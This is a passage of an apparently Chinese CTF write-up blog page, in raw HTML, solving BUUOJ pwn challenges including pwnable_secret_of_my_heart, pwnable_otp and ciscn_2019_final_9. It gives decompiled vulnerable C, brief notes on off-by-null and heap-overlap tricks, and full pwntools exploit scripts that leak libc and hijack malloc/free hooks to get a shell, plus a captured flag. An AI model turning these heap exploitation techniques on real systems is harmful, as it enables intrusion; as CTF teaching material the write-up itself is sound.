class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">25211</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'&gt;&gt; '</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">password, size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'passwd:'</span>, password)</span><br><span class="line">    r.sendlineafter(<span class="string">'size:'</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">'Content:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">password, index, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'passwd:'</span>, password)</span><br><span class="line">    r.sendlineafter(<span class="string">'index:'</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">'Content:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">password, index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'passwd:'</span>, password)</span><br><span class="line">    r.sendlineafter(<span class="string">'index:'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>, <span class="number">0x410</span>, <span class="string">'aaaaa'</span>)</span><br><span class="line">add(<span class="string">'a'</span>, <span class="number">0x20</span>, <span class="string">'bbbbb'</span>)</span><br><span class="line">add(<span class="string">'a'</span>, <span class="number">0x20</span>, <span class="string">'cccc'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'a'</span>, <span class="number">0</span>)</span><br><span class="line">add(<span class="string">'a'</span>, <span class="number">0x410</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">li(<span class="string">'malloc_hook = '</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./2.27/libc-2.27.so'</span>)</span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">li(<span class="string">'libc_base = '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">li(<span class="string">'free_hook = '</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbgg()</span></span><br><span class="line"></span><br><span class="line">delete(<span class="string">'a'</span> * <span class="number">0x27</span>, <span class="number">2</span>)</span><br><span class="line">delete(<span class="string">'a'</span> * <span class="number">0x27</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>, <span class="number">0x20</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">'1: '</span>)</span><br><span class="line">heap_ptr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'heap_ptr = '</span> + <span class="built_in">hex</span>(heap_ptr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbgg()</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(menu, <span class="string">'4'</span>)</span><br><span class="line">r.sendafter(<span class="string">'passwd:'</span>, <span class="string">b'a'</span> * <span class="number">0x20</span> + p64(heap_ptr))</span><br><span class="line">r.sendlineafter(<span class="string">'index:'</span>, <span class="string">'99'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>, <span class="number">0x20</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_base</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>, <span class="number">0x20</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="string">'a'</span>, <span class="number">0x20</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'a'</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="pwnable-secret-of-my-heart"><a href="#pwnable-secret-of-my-heart" class="headerlink" title="pwnable_secret_of_my_heart"></a>pwnable_secret_of_my_heart</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">sub_D27</span><span class="params">(Data *ptr, <span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  ptr-&gt;size = size;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name of heart :"</span>);</span><br><span class="line">  vuln_read(ptr-&gt;name, <span class="number">0x20</span>u);</span><br><span class="line">  ptr-&gt;content = (__int64)<span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr-&gt;content )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocate Error !"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"secret of my heart :"</span>);</span><br><span class="line">  result = (_BYTE *)(ptr-&gt;content + (<span class="type">int</span>)vuln_read((<span class="type">void</span> *)ptr-&gt;content, size));<span class="comment">// off-by-null</span></span><br><span class="line">  *result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>在add里出现了off-by-null，2.23直接堆重叠，最后通过double free错误来getshell</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./secret_of_my_heart'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">27358</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'Your choice :'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, name, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Size of heart : '</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">'Name of heart :'</span>, name)</span><br><span class="line">    r.sendafter(<span class="string">'secret of my heart :'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index :'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index :'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>, <span class="string">'aaaaa'</span>, <span class="string">'b'</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'aaaaa'</span>, <span class="string">'c'</span>)</span><br><span class="line">add(<span class="number">0xf8</span>, <span class="string">'aaaaa'</span>, <span class="string">'d'</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'aaaaa'</span>, <span class="string">'e'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'aaaaa'</span>, <span class="string">b'c'</span> * <span class="number">0x60</span> + p64(<span class="number">0x100</span> + <span class="number">0x70</span>)) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>, <span class="string">'aaaaa'</span>, <span class="string">'f'</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line">li(<span class="string">'malloc_hook = '</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF('./2.23/libc-2.23.so')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">li(<span class="string">'libc_base = '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#one = [0x45226, 0x4527a, 0xf03a4, 0xf1247]</span></span><br><span class="line">one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = one[<span class="number">2</span>] + libc_base</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">'__realloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'aaaaa'</span>, <span class="string">b'g'</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'aaaaa'</span>, p64(malloc_hook - <span class="number">0x23</span>)) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'aaaaa'</span>, <span class="string">'bbbbb'</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'aaaaa'</span>, <span class="string">'ccccc'</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'aaaaa'</span>, <span class="string">b'\x00'</span> * <span class="number">0x13</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="pwnable-otp"><a href="#pwnable-otp" class="headerlink" title="pwnable_otp"></a>pwnable_otp</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>{</span><br><span class="line">	<span class="type">char</span> fname[<span class="number">128</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> otp[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(argc!=<span class="number">2</span>){</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"usage : ./otp [passcode]\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span>(fd==<span class="number">-1</span>) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(read(fd, otp, <span class="number">16</span>)!=<span class="number">16</span>) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span>(fname, <span class="string">"/tmp/%llu"</span>, otp[<span class="number">0</span>]);</span><br><span class="line">	FILE* fp = fopen(fname, <span class="string">"w"</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp==<span class="literal">NULL</span>){ <span class="built_in">exit</span>(<span class="number">-1</span>); }</span><br><span class="line">	fwrite(&amp;otp[<span class="number">1</span>], <span class="number">8</span>, <span class="number">1</span>, fp);</span><br><span class="line">	fclose(fp);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"OTP generated.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> passcode=<span class="number">0</span>;</span><br><span class="line">	FILE* fp2 = fopen(fname, <span class="string">"r"</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp2==<span class="literal">NULL</span>){ <span class="built_in">exit</span>(<span class="number">-1</span>); }</span><br><span class="line">	fread(&amp;passcode, <span class="number">8</span>, <span class="number">1</span>, fp2);</span><br><span class="line">	fclose(fp2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(strtoul(argv[<span class="number">1</span>], <span class="number">0</span>, <span class="number">16</span>) == passcode){</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line">		setuid(<span class="number">0</span>);</span><br><span class="line">		setgid(<span class="number">0</span>);</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">else</span>{</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OTP mismatch\n"</span>);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	unlink(fname);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这里学到了<code>ulimit -f 0</code>来限制进程创建文件的大小为0，这个题目意思就是从<code>/dev/urandow</code>读16个字节，前8个字节做为文件名，后8个字节存在该文件内，最后读入比较</p>
<p>所以利用<code>ulimit -f 0</code>使得无法写入文件，之后读的时候就是0，所以passcode为0</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">otp@out:~$ python</span><br><span class="line">Python <span class="number">2.7</span><span class="number">.15</span>+ (default, Nov <span class="number">27</span> <span class="number">2018</span>, <span class="number">23</span>:<span class="number">36</span>:<span class="number">35</span>)</span><br><span class="line">[GCC <span class="number">7.3</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">'./otp 0'</span>)</span><br><span class="line">OTP generated.</span><br><span class="line">Congratz!</span><br><span class="line">flag{2949dd01-bb88-<span class="number">4738</span>-b337-89e7468e3cf7}</span><br><span class="line"><span class="number">0</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></tbody></table></figure>

<h2 id="ciscn-2019-final-9"><a href="#ciscn-2019-final-9" class="headerlink" title="ciscn_2019_final_9"></a>ciscn_2019_final_9</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">safe_read</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">int</span> size)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  index = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      read(<span class="number">0</span>, &amp;ptr[index], <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( size - <span class="number">1</span> &lt; index || !ptr[index] || ptr[index] == <span class="number">10</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++index;</span><br><span class="line">    }</span><br><span class="line">    ptr[index] = <span class="number">0</span>;</span><br><span class="line">    ptr[size] = <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>一个off-by-null，但是\x00的话会被截断，所以控制不了prev_size，这个时候就需要用到unsortedbin的一个知识，释放两个unsortedbin使得合并，此时，第三个chunk的prev_size就等于1 + 2，所以prev_size就被控制了，此时构造重叠即可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./ciscn_final_9'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">26862</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">'&gt; '</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'size \n&gt; '</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">'content \n&gt; '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'index \n&gt; '</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'index \n&gt; '</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xf0</span>, <span class="string">'b'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span 